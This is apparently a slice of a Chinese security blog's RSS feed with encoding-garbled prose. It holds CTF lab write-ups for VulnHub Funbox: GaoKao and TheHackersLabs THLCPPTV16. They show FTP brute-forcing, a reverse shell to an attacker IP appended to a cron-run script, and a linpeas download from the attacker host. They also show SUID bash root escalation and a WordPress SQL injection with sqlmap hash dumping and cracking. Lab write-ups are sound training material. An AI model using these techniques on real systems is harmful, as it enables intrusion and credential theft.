Êó†ËÆ∫ÊòØÊ°åÈù¢Á´ØËøòÊòØÁßªÂä®Á´ØÔºåÊï¥‰ΩìËßÜËßâÈ£éÊ†ºÈÉΩËøõË°å‰∫Ü‰∏ÄÊ¨°ÂçáÁ∫ßÔºö

*   **Êõ¥ÊüîÂíåÁöÑËßÇÊÑü**ÔºöÈááÁî®‰∫ÜÂ∏¶ÊúâÈÄèÊòéÂ∫¶ÂíåÊ®°Á≥äÊïàÊûúÁöÑËÉåÊôØ‰∏éÂç°ÁâáËÆæËÆ°ÔºàÁ±ª‰ººÊØõÁéªÁíÉÊïàÊûúÔºâÔºåÂ¢ûÂä†‰∫ÜÈ°µÈù¢ÁöÑÂ±ÇÊ¨°ÊÑü„ÄÇ
*   **Á≤æËá¥ÁöÑÁªÜËäÇ**Ôºö‰ºòÂåñ‰∫ÜÂúÜËßí„ÄÅÈò¥ÂΩ±ÂíåËæπÊ°ÜÔºåËÆ©ÂÖÉÁ¥†ÁúãËµ∑Êù•Êõ¥Âä†ÁªÜËÖª„ÄÇÂàóË°®È°π„ÄÅÊ†áÁ≠æ„ÄÅÊåâÈíÆÁ≠âÈÉΩÊ∑ªÂä†‰∫ÜÊõ¥Âπ≥ÊªëÁöÑÊÇ¨ÂÅúÊïàÊûúÂíåËøáÊ∏°Âä®Áîª„ÄÇ
*   **Áé∞‰ª£ÊÑüÂ≠ó‰Ωì‰∏éÊéíÁâà**ÔºöÂæÆË∞É‰∫ÜÂ≠ó‰Ωì„ÄÅË°åÈ´òÂíåÊÆµËêΩÈó¥Ë∑ùÔºåÂäõÊ±ÇÊõ¥‰Ω≥ÁöÑÈòÖËØªËàíÈÄÇÂ∫¶„ÄÇÊñáÁ´†Ê†áÈ¢ò‰πüÊõ¥Âä†ÈÜíÁõÆ„ÄÇ

### 3. ÊÄßËÉΩ‰ºòÂåñÔºöÂÆöÂà∂ÊáíÂä†ËΩΩ üöÄ

ËÄÉËôëÂà∞ÁΩëÁ´ôÂõæÁâáÂü∫Êú¨ÈÉΩ‰ΩøÁî®‰∫Ü jsDelivr CDNÔºå‰∏∫‰∫ÜËøõ‰∏ÄÊ≠•ÊèêÂçáÂä†ËΩΩÈÄüÂ∫¶Ôºö

*   **ÊáíÂä†ËΩΩ‰∏äÁ∫ø**ÔºöÊàëÁºñÂÜôÂπ∂ÈÉ®ÁΩ≤‰∫Ü‰∏Ä‰∏™**ÂÆöÂà∂ÁöÑÂõæÁâáÊáíÂä†ËΩΩËÑöÊú¨**„ÄÇÁé∞Âú®ÔºåÈ°µÈù¢‰∏≠ÁöÑÂõæÁâáÔºàÈô§‰∫ÜÂ§¥ÂÉèÂíåÈÉ®ÂàÜÂ∞èÂõæÊ†áÔºâÂè™ÊúâÂú®Âç≥Â∞ÜÊªöÂä®Âà∞ËßÜÂè£Êó∂Êâç‰ºöÂä†ËΩΩÔºåËøôÂØπ‰∫éÂõæÁâáËæÉÂ§öÁöÑÊñáÁ´†È°µÈù¢ÊïàÊûúÂ∞§ÂÖ∂ÊòéÊòæÔºåÂèØ‰ª•ÊúâÊïàÂáèÂ∞ëÂàùÂßãÂä†ËΩΩÊó∂Èó¥„ÄÇ
*   **ÂëäÂà´Á¨¨‰∏âÊñπÂ∫ì**ÔºöÊõøÊç¢Êéâ‰∫Ü‰πãÂâçÂ∞ùËØï‰ΩøÁî®ÁöÑÁ¨¨‰∏âÊñπÊáíÂä†ËΩΩÂ∫ìÔºåÁé∞Âú®Ëøô‰∏™ÂäüËÉΩÂÆåÂÖ®Áî±Êàë‰ª¨Ëá™Â∑±ÊéåÊéßÔºåÊõ¥Ë¥¥ÂêàÂçöÂÆ¢ÁöÑÂÆûÈôÖÈúÄÊ±Ç„ÄÇ

### 4. ‰æßËæπÊ†è‰ø°ÊÅØÂç°Áâá üìä

Â¶ÇÊûú‰Ω†Âú®Ê°åÈù¢Á´ØËÆøÈóÆÔºåÂ∫îËØ•ËÉΩÁúãÂà∞È°µÈù¢Â∑¶‰æßÔºàÊàñÁâπÂÆö‰ΩçÁΩÆÔºâÊñ∞Â¢û‰∫Ü‰∏Ä‰∏™**‰ø°ÊÅØÁªüËÆ°Âç°Áâá**ÔºåÂ±ïÁ§∫‰∫ÜÁΩëÁ´ôËøêË°åÂ§©Êï∞„ÄÅËÆøÈóÆÈáèÁ≠âÊï∞ÊçÆÔºåÂ¢ûÊ∑ª‰∫Ü‰∏ÄÁÇπÂ∞èÂ∞èÁöÑ‚Äú‰ª™ÂºèÊÑü‚Äù„ÄÇ

---

ËøôÊ¨°ÊîπÂä®‰∏ªË¶ÅÊ∂âÂèäÂ§ßÈáèÁöÑ CSS Ê†∑ÂºèË∞ÉÊï¥Âíå‰∏Ä‰∫õ JavaScript ËÑöÊú¨ÁöÑ‰ºòÂåñ‰∏éÁºñÂÜô„ÄÇËôΩÁÑ∂ËøáÁ®ãÊúâÁÇπÁπÅÁêêÔºàÂ∞§ÂÖ∂ÊòØË∞ÉËØïÂêÑÁßçÁªÜËäÇüòÇÔºâÔºå‰ΩÜÁúãÂà∞ÊúÄÁªàÁöÑÊïàÊûúÔºåÊÑüËßâËøòÊòØÊå∫ÂÄºÂæóÁöÑ„ÄÇ

**Ê¨¢ËøéÂ§ßÂÆ∂Âà∞Â§ÑÁÇπÁÇπÁúãÔºå‰ΩìÈ™å‰∏Ä‰∏ãÊñ∞ÁïåÈù¢ÔºÅ** Â¶ÇÊûúÂú®ÊµèËßàËøáÁ®ã‰∏≠ÂèëÁé∞‰ªª‰ΩïÊòæÁ§∫ÂºÇÂ∏∏„ÄÅÊ†∑ÂºèÈîô‰π±ÔºåÊàñËÄÖÊúâ‰ªª‰ΩïÊîπËøõÂª∫ËÆÆÔºåËØ∑Âä°ÂøÖÈÄöËøáËØÑËÆ∫ÂëäËØâÊàëÔºåÊàë‰ºöÂ∞ΩÂø´‰øÆÂ§çÂíåÂÆåÂñÑÔºÅ

ÊÑüË∞¢Â§ßÂÆ∂ÁöÑÂÖ≥Ê≥®ÂíåÊîØÊåÅÔºÅsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/%E2%9C%A8%20-huan-ran-yi-xin-%EF%BC%9A-wo-de-bo-ke-jie-mian-mei-hua-zhi-lv-%20%E2%9C%A8.html</guid><pubDate>Fri, 27 Jun 2025 09:34:09 +0000</pubDate></item><item><title>vulnhub_Funbox_ GaoKao</title><link>https://7r1UMPHK.github.io/post/vulnhub_Funbox_%20GaoKao.html</link><description># vulnhub_Funbox: GaoKao

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºöhttps://vulnhub.com/entry/funbox-gaokao,707/  
**ÈöæÂ∫¶**ÔºöÁªøËâ≤  
**ÁõÆÊ†á IP**Ôºö192.168.205.152  
**Êú¨Êú∫ IP**Ôºö192.168.205.128

# 1.Êâ´Êèè

‚Äã`nmap`‚ÄãËµ∑Êâã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -A -Pn -n --min-rate 10000 192.168.205.152
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 17:56 CST
Nmap scan report for 192.168.205.152
Host is up (0.00025s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 ftp      ftp           169 Jun  5  2021 welcome.msg
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 48:39:31:22:fb:c2:03:44:a7:4e:c0:fa:b8:ad:2f:96 (RSA)
|   256 70:a7:74:5e:a3:79:60:28:1a:45:4c:ab:5c:e7:87:ad (ECDSA)
|_  256 9c:35:ce:f6:59:66:7f:ae:c4:d1:21:16:d5:aa:56:71 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wellcome to Funbox: Gaokao !
|_http-server-header: Apache/2.4.29 (Ubuntu)
3306/tcp open  mysql   MySQL 5.7.34-0ubuntu0.18.04.1
| ssl-cert: Subject: commonName=MySQL_Server_5.7.34_Auto_Generated_Server_Certificate
| Not valid before: 2021-06-05T15:15:30
|_Not valid after:  2031-06-03T15:15:30
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.34-0ubuntu0.18.04.1
|   Thread ID: 3
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, LongPassword, IgnoreSpaceBeforeParenthesis, LongColumnFlag, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, IgnoreSigpipes, SupportsLoadDataLocal, SupportsCompression, ODBCClient, FoundRows, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: w5w-\x05[lh(@\x08Zp*'=C:\x01\x10
|_  Auth Plugin Name: mysql_native_password
MAC Address: 08:00:27:84:89:FF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.25 ms 192.168.205.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.41 seconds
                                      
```

GaokaoÂèØËÉΩÊòØ‰∏Ä‰∏™Áî®Êà∑

# 2.Ë∏©ÁÇπ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ftp 192.168.205.152
Connected to 192.168.205.152.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.205.152]
Name (192.168.205.152:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@192.168.205.128 !
230-
230-The local time is: Sun Feb 09 09:57:05 2025
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to &lt;sky@funbox9&gt;.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||13045|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Jun  5  2021 .
drwxr-xr-x   2 ftp      ftp          4096 Jun  5  2021 ..
-rw-r--r--   1 ftp      ftp           169 Jun  5  2021 welcome.msg
226 Transfer complete
ftp&gt; mget welcome.msg
mget welcome.msg [anpqy?]? y                                                                                                         
229 Entering Extended Passive Mode (|||48839|)
150 Opening BINARY mode data connection for welcome.msg (169 bytes)
100% |******************************************************************************************|   169        5.55 MiB/s    00:00 ETA
226 Transfer complete
169 bytes received in 00:00 (150.30 KiB/s)
ftp&gt; exit
221 Goodbye.
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat welcome.msg 
Welcome, archive user %U@%R !

The local time is: %T

This is an experimental FTP server.  If you have any unusual problems,
please report them via e-mail to &lt;sky@%L&gt;.

                
```

skyÂèØËÉΩÊòØ‰∏Ä‰∏™Áî®Êà∑ÔºåÁªßÁª≠

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.152 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.152
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,md,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10310]
/.                    (Status: 200) [Size: 10310]

```

Â∞±‰∏Ä‰∏™ÈªòËÆ§È°µÔºåÈ°µÈù¢Êó†ÈöêËóèÔºåÁàÜÁ†¥ssh,ftpÔºàmysqlÔºåË¶ÅÊòØÁúüÊ≤°ÊúâÂÜçËØ¥Ôºâ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ hydra -L user -P /usr/share/wordlists/q5000.txt ssh://192.168.205.152 -V -I -u -f -e nsr -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-09 18:01:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10006 login tries (l:2/p:5003), ~157 tries per task
[DATA] attacking ssh://192.168.205.152:22/

```

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ hydra -L user -P /usr/share/wordlists/q5000.txt ftp://192.168.205.152 -V -I -u -f -e nsr -t 64

Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-09 18:01:04
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10006 login tries (l:2/p:5003), ~157 tries per task
[DATA] attacking ftp://192.168.205.152:21/

[21][ftp] host: 192.168.205.152   login: sky   password: thebest
[STATUS] attack finished for 192.168.205.152 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-09 18:02:53

```

ftpÊúâÁªìÊûúÔºå‰∏äÂéªÁúãÁúã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ftp 192.168.205.152
Connected to 192.168.205.152.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.205.152]
Name (192.168.205.152:kali): sky
331 Password required for sky
Password: 
230 User sky logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||39399|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 sky      sky          4096 Jun  6  2021 .
drwxr-xr-x   5 root     root         4096 Jun  5  2021 ..
-rw-------   1 sky      sky            56 Jun  5  2021 .bash_history
-r--r--r--   1 sky      sky           220 Jun  5  2021 .bash_logout
-r--r--r--   1 sky      sky          3771 Jun  5  2021 .bashrc
-r--r--r--   1 sky      sky           807 Jun  5  2021 .profile
drwxr-----   2 root     root         4096 Jun  5  2021 .ssh
-rwxr-x---   1 sky      sarah          66 Jun  6  2021 user.flag
-rw-------   1 sky      sky          1489 Jun  5  2021 .viminfo
226 Transfer complete
ftp&gt; mget *
mget user.flag [anpqy?]? y
229 Entering Extended Passive Mode (|||51733|)
150 Opening BINARY mode data connection for user.flag (66 bytes)
100% |******************************************************************************************|    66        1.65 MiB/s    00:00 ETA
226 Transfer complete
66 bytes received in 00:00 (41.31 KiB/s)
ftp&gt; exit
221 Goodbye.
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat user.flag 
#!/bin/sh
echo 'Your flag is:88jjggzzZhjJjkOIiu76TggHjoOIZTDsDSd'
              
```

Êúâ‰∏™ËÑöÊú¨ÔºåÊúâÁÇπÂÉèÂêéÂè∞ËÑöÊú¨ÔºåÊàë‰ª¨Âä†‰∏™shell‰∏äÂéªËØïËØï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ echo 'bash -i &gt;&amp;/dev/tcp/192.168.205.128/8888 0&gt;&amp;1' &gt;&gt; user.flag
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ftp 192.168.205.152
Connected to 192.168.205.152.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.205.152]
Name (192.168.205.152:kali): sky
331 Password required for sky
Password: 
230 User sky logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||24304|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 sky      sky          4096 Jun  6  2021 .
drwxr-xr-x   5 root     root         4096 Jun  5  2021 ..
-rw-------   1 sky      sky            56 Jun  5  2021 .bash_history
-r--r--r--   1 sky      sky           220 Jun  5  2021 .bash_logout
-r--r--r--   1 sky      sky          3771 Jun  5  2021 .bashrc
-r--r--r--   1 sky      sky           807 Jun  5  2021 .profile
drwxr-----   2 root     root         4096 Jun  5  2021 .ssh
-rwxr-x---   1 sky      sarah          66 Jun  6  2021 user.flag
-rw-------   1 sky      sky          1489 Jun  5  2021 .viminfo
226 Transfer complete
ftp&gt; put user.flag 
local: user.flag remote: user.flag
229 Entering Extended Passive Mode (|||53542|)
150 Opening BINARY mode data connection for user.flag
100% |******************************************************************************************|   111        2.35 MiB/s    00:00 ETA
226 Transfer complete
111 bytes sent in 00:00 (117.56 KiB/s)

```

Âè¶Â§ñÁ™óÂè£ÁõëÊµã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.152] 52670
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ id
id
uid=1002(sarah) gid=1002(sarah) groups=1002(sarah)

```

# 3. Ëé∑ÂæóÁ®≥ÂÆöÁöÑ Shell

Ëé∑Âèñ**ÂèçÂêë shell** ÂêéÔºåÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Ëé∑ÂæóÁ®≥ÂÆöÁöÑ**‰∫§‰∫íÂºè** **TTY shell**Ôºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.ÊèêÊùÉ

```
bash-4.4$ sudo -l
[sudo] password for sarah: 
bash-4.4$ ls -al
total 36
dr-xr-xr-x 4 sarah sarah 4096 Jun  6  2021 .
drwxr-xr-x 5 root  root  4096 Jun  5  2021 ..
-r--r--r-- 1 sarah sarah  220 Jun  5  2021 .bash_logout
-r--r--r-- 1 sarah sarah 3771 Jun  5  2021 .bashrc
dr-x------ 2 sarah sarah 4096 Jun  5  2021 .cache
dr-x------ 3 sarah sarah 4096 Jun  5  2021 .gnupg
-r--r--r-- 1 sarah sarah  807 Jun  5  2021 .profile
-r--rw-r-- 1 sarah sarah   74 Jun  5  2021 .selected_editor
-r-------- 1 sarah sarah 3214 Jun  6  2021 .viminfo
bash-4.4$ cd ..
bash-4.4$ ls -la
total 20
drwxr-xr-x  5 root  root  4096 Jun  5  2021 .
drwxr-xr-x 24 root  root  4096 Jun  5  2021 ..
drwxr-xr-x  4 lucy  lucy  4096 Jun  6  2021 lucy
dr-xr-xr-x  4 sarah sarah 4096 Jun  6  2021 sarah
drwxr-xr-x  3 sky   sky   4096 Jun  6  2021 sky
bash-4.4$ cd lucy/
bash-4.4$ ls -al
total 36
drwxr-xr-x 4 lucy lucy 4096 Jun  6  2021 .
drwxr-xr-x 5 root root 4096 Jun  5  2021 ..
-rw------- 1 lucy lucy  192 Jun  6  2021 .bash_history                                                                               
-rw-r--r-- 1 lucy lucy  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 lucy lucy 3771 Apr  4  2018 .bashrc
drwx------ 2 lucy lucy 4096 Jun  5  2021 .cache
drwx------ 3 lucy lucy 4096 Jun  5  2021 .gnupg
-rw-r--r-- 1 lucy lucy  807 Apr  4  2018 .profile
-rw-r--r-- 1 lucy lucy    0 Jun  5  2021 .sudo_as_admin_successful
-rw------- 1 lucy lucy  702 Jun  6  2021 .viminfo
bash-4.4$ cd ..
bash-4.4$ ls -al
total 20
drwxr-xr-x  5 root  root  4096 Jun  5  2021 .
drwxr-xr-x 24 root  root  4096 Jun  5  2021 ..
drwxr-xr-x  4 lucy  lucy  4096 Jun  6  2021 lucy
dr-xr-xr-x  4 sarah sarah 4096 Jun  6  2021 sarah
drwxr-xr-x  3 sky   sky   4096 Jun  6  2021 sky
bash-4.4$ cd sky/
bash-4.4$ ls -al
total 36
drwxr-xr-x 3 sky  sky   4096 Jun  6  2021 .
drwxr-xr-x 5 root root  4096 Jun  5  2021 ..
-rw------- 1 sky  sky     56 Jun  5  2021 .bash_history
-r--r--r-- 1 sky  sky    220 Jun  5  2021 .bash_logout
-r--r--r-- 1 sky  sky   3771 Jun  5  2021 .bashrc
-r--r--r-- 1 sky  sky    807 Jun  5  2021 .profile
drwxr----- 2 root root  4096 Jun  5  2021 .ssh
-rwxr-x--- 1 sky  sarah  111 Feb  9 10:04 user.flag
-rw------- 1 sky  sky   1489 Jun  5  2021 .viminfo
bash-4.4$ find / -perm -4000 -type f 2&gt;/dev/null
/bin/su
/bin/fusermount
/bin/ping
/bin/mount
/bin/umount
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/procmail
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

```

‰º†ËÑöÊú¨ÔºàÂÖ∂ÂÆûÊòØÊàëÈù∂Êú∫ÊäΩÈ£é‰∫ÜÔºåÂ∞ë‰∫Ü‰∏™bashÔºâ

```
bash-4.4$ wget 192.168.205.128/linpeas.sh
--2025-02-09 10:08:54--  http://192.168.205.128/linpeas.sh
Connecting to 192.168.205.128:80... failed: Connection refused.
bash-4.4$ wget 192.168.205.128/linpeas.sh
--2025-02-09 10:08:59--  http://192.168.205.128/linpeas.sh
Connecting to 192.168.205.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 839766 (820K) [text/x-sh]
Saving to: ‚Äòlinpeas.sh‚Äô

linpeas.sh                                                   0%[                                                                       linpeas.sh                                                 100%[========================================================================================================================================&gt;] 820.08K  --.-KB/s    in 0.003s  

2025-02-09 10:08:59 (269 MB/s) - ‚Äòlinpeas.sh‚Äô saved [839766/839766]

bash-4.4$ chmod +x linpeas.sh 
bash-4.4$ bash linpeas.sh 
```

‰πüÊ≤°ÊúâÔºåÈáçË£ÖÂêß

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
id
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.152] 48504
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ id
uid=1002(sarah) gid=1002(sarah) groups=1002(sarah)
bash-4.4$ find / -perm -4000 -type f 2&gt;/dev/null
find / -perm -4000 -type f 2&gt;/dev/null
/bin/bash
/bin/su
/bin/fusermount
/bin/ping
/bin/mount
/bin/umount
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/procmail
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

```

bash -p

```
bash-4.4$ bash -p
bash -p
id
uid=1002(sarah) gid=1002(sarah) euid=0(root) egid=0(root) groups=0(root),1002(sarah)

```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/vulnhub_Funbox_%20GaoKao.html</guid><pubDate>Fri, 27 Jun 2025 09:34:06 +0000</pubDate></item><item><title>thl_THLCPPT_V16Á¨îËÆ∞</title><link>https://7r1UMPHK.github.io/post/thl_THLCPPT_V16-bi-ji.html</link><description># thl_THLCPPT_V16Á¨îËÆ∞

**Èù∂Êú∫**Ôºöhttps://thehackerslabs.com/thlcpptv16/

**ÈöæÂ∫¶**Ôºö‰∏ìÂÆ∂ÔºàEXPERTOÔºâ

**ÁõÆÊ†á IP**Ôºö192.168.205.152
**Êú¨Êú∫ IP**Ôºö192.168.205.141

# 1.Á´ØÂè£Êûö‰∏æÂèäÊúçÂä°Êé¢Êµã

‰ΩøÁî® `nmap` Êâ´ÊèèÁõÆÊ†á IP ÁöÑÂºÄÊîæÁ´ØÂè£Ôºö

```
nmap 192.168.205.152
```

![image](https://github.com/user-attachments/assets/c9e617e5-96af-47a7-832e-7ea63715d9d6)

ËÆøÈóÆ 80 Á´ØÂè£

![image](https://github.com/user-attachments/assets/b8625cb6-3e5c-483b-aa82-6ccbfc550f2a)

ÁÇπÂáª Ir al Examen ÂèëÁé∞Â≠êÂüüÔºåÂàÜÂà´‰∏∫Ôºö

1. examen.thlcpptv16.thl
2. thlcpptv16.thl

Â∞ÜËøô‰∏§‰∏™ÂüüÂêçÊ∑ªÂä†Âà∞ `/etc/hosts` Êñá‰ª∂‰∏≠ÔºåËøõ‰∏ÄÊ≠•Êé¢Êü•„ÄÇ

![image](https://github.com/user-attachments/assets/dc44dd45-d812-4514-ac6b-8d114af6acba)

ÊâìÂºÄ `examen.thlcpptv16.thl`ÔºåÂèëÁé∞ÁõÆÊ†áËøêË°å‰∫Ü **WordPress**„ÄÇ

# 2.Wordpress Êûö‰∏æ

‰ΩøÁî® **wpscan** ËøõË°å WordPress Áî®Êà∑Êûö‰∏æÔºö

```
wpscan --url examen.thlcpptv16.thl -e vp,u --api-token xxx   #api-tokenÊ≥®ÂÜåwpscanÂÆòÁΩëËé∑Âèñ
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫‰ª•‰∏ãÁî®Êà∑Ôºö

1. **examinador**
2. **tom**
3. **jerry**

![image](https://github.com/user-attachments/assets/9bcae154-f035-4d1d-b807-d6722bc3749a)

Áî®Êà∑ËæÉÂ§öÔºåÂõ†Ê≠§Êàë‰ª¨Â∞ùËØï SQL Ê≥®ÂÖ•ÊºèÊ¥û„ÄÇÂÖ≥‰∫éËØ•ÊºèÊ¥ûÁöÑÊõ¥Â§ö‰ø°ÊÅØÂèØ‰ª•ÂèÇËÄÉ

&gt; [!IMPORTANT]
&gt;
&gt; 1. https://wpscan.com/vulnerability/2b5860f1-f029-496a-a479-082b78c5bda4
&gt; 2. https://www.tenable.com/security/research/tra-2023-40

![image](https://github.com/user-attachments/assets/d54e46b9-e1d9-4ae4-959d-533c500828fc)

![image](https://github.com/user-attachments/assets/48e4be02-5f6e-4566-bd5c-134fbc36e90d)

# 3.SQL Ê≥®ÂÖ•ÊºèÊ¥ûÂà©Áî®

Â∞ùËØïÊûÑÈÄ† SQL Ê≥®ÂÖ• payloadÔºåÂà©Áî®ÊºèÊ¥ûËé∑Âèñ WordPress Êï∞ÊçÆÂ∫ì‰∏≠ÁöÑÁî®Êà∑‰ø°ÊÅØÔºö

```
http://examen.thlcpptv16.thl/?rest_route=/my-calendar/v1/events&amp;to=1*
```

ÁÑ∂Âêé‰ΩøÁî® **sqlmap** ËøõË°åËá™Âä®ÂåñÊ≥®ÂÖ•ÔºåÊèêÂèñÁî®Êà∑‰ø°ÊÅØÔºö

```
sqlmap -u 'examen.thlcpptv16.thl/?rest_route=/my-calendar/v1/events&amp;to=1*' --batch -D wordpress -T wp_users -C user_login,user_pass --dump
```

ËæìÂá∫Â¶Ç‰∏ãÔºåÊàêÂäüËé∑ÂèñÂà∞Áî®Êà∑ÁöÑÂìàÂ∏åÂØÜÁ†ÅÔºö

```
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| jerry      | $P$B0uohNeAjd6aq3n0dv6NC7Nhkro0Kt. |
| examinador | $P$B43UAoTTnv0stdbxGqzwyQtyXm86x/1 |
| tom        | $P$BJrv/Sv/rBlufcIW5FiMdUW4lA5UrN1 |
+------------+------------------------------------+
```

# 4.Hash ÂØÜÁ†ÅÁàÜÁ†¥

‰ΩøÁî® **hashid** Â∑•ÂÖ∑ËØÜÂà´ÂìàÂ∏åÁÆóÊ≥ïÔºö

```
hashid -e hash
```

![image](https://github.com/user-attachments/assets/3e569c79-85a8-4b52-974f-91f1505f192b)

ÁÑ∂Âêé‰ΩøÁî® **hashcat** ËøõË°åÂØÜÁ†ÅÁàÜÁ†¥Ôºö

```
hashcat -a 0 -m 400 hash /usr/share/wordlists/q5000.txt
```

![image](https://github.com/user-attachments/assets/46a062a2-b8ac-46dd-9edc-2a7030aa7854)

ÁàÜÁ†¥ÊàêÂäüÔºåËé∑Âæó‰∫Ü `tom` Áî®Êà∑Âá≠ËØÅ

# 5.WrapWrap Filter ÊºèÊ¥û

&gt; [!IMPORTANT]
&gt; https://github.com/ambionics/wrapwrap

